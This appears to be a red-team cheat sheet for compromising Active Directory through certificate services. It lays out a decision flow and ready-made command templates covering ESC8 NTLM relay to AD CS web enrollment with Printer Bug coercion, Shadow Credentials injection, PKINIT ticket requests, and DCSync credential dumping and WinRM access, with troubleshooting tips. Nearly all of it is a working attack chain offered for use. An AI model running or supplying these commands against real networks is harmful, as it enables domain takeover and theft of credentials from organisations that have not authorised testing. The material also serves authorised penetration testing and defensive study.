

1. Check for AD CS web enrollment over HTTP at `/CertSrv`. If present, initiate ESC8 relay.
2. If ESC8 is viable, start `ntlmrelayx` with the target template (e.g., KerberosAuthentication) and coerce the target (e.g., Printer Bug) to obtain a certificate.
3. If web enrollment is unavailable, check BloodHound for the `AddKeyCredentialLink` edge. If found, use `pywhisker` to inject a public key and generate a certificate.
4. With a certificate (.pfx) obtained, use `gettgtpkinit.py` to request a TGT.
5. If the KDC does not support the certificate's EKU, use `PassTheCert` to authenticate via LDAPS.
6. Export the resulting ccache to `KRB5CCNAME` and proceed to DCSync or remote access tools.

---

## AD CS NTLM Relay (ESC8)

AD CS web enrollment is active over HTTP (default at `/CertSrv`) and a coercion method is available.

Listen for inbound NTLM and relay to the enrollment endpoint

```
impacket-ntlmrelayx -t http://<TARGET_IP>/certsrv/certfnsh.asp --adcs -smb2support --template <SERVICE_NAME>
```

Trigger the Printer Bug to force machine authentication

```
python3 printerbug.py <DOMAIN>/<USERNAME>:"<PASSWORD>"@<TARGET_IP> <ATTACK_IP>
```

**Dangerous / misconfigured settings**

- Web enrollment allowed over HTTP instead of HTTPS
- Print Spooler service enabled on Domain Controllers

**Gotchas**

- **Template mismatch** will result in no certificate being issued; verify template name with certipy.
- **Print Spooler disabled** prevents the Printer Bug from triggering coercion.

## Shadow Credentials Injection

`AddKeyCredentialLink` permissions exist over the target object, allowing modification of the `msDS-KeyCredentialLink` attribute.

Inject public key and export PFX certificate

```
pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --target <USERNAME> --action add
```

**Gotchas**

- **Write permissions missing** on the target's `msDS-KeyCredentialLink` attribute causes injection failure.

## PKINIT Authentication (Pass-the-Certificate)

Valid X.509 certificate (.pfx) for a user or machine account is present.

Request TGT using certificate and save to ccache

```
python3 gettgtpkinit.py -cert-pfx <FILE_PATH> -dc-ip <DC_IP> '<DOMAIN>/<USERNAME>' <FILE_PATH>
```

Request TGT using certificate with a PFX password

```
python3 gettgtpkinit.py -cert-pfx <FILE_PATH> -pfx-pass '<PASSWORD>' -dc-ip <DC_IP> <DOMAIN>/<USERNAME> <FILE_PATH>
```

**Edge cases**

- Use `PassTheCert` if the **KDC does not support PKINIT or specific EKUs**, allowing for LDAPS authentication instead.

**Gotchas**

- **libcrypto version error** blocks `gettgtpkinit.py` execution; fix by installing the `oscrypto` library.

## Post-Exploitation with Kerberos TGT

TGT is obtained and saved as a ccache file.

Set the environment variable to use the obtained TGT

```
export KRB5CCNAME=<FILE_PATH>
```

Perform DCSync as the DC machine account

```
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user <USERNAME> '<DOMAIN>/<USERNAME>'@<TARGET_IP>
```

Authenticate via WinRM using Kerberos

```
evil-winrm -i <TARGET_IP> -r <DOMAIN>
```

**Gotchas**

- **Improper krb5.conf** configuration will cause `evil-winrm` Kerberos authentication to fail.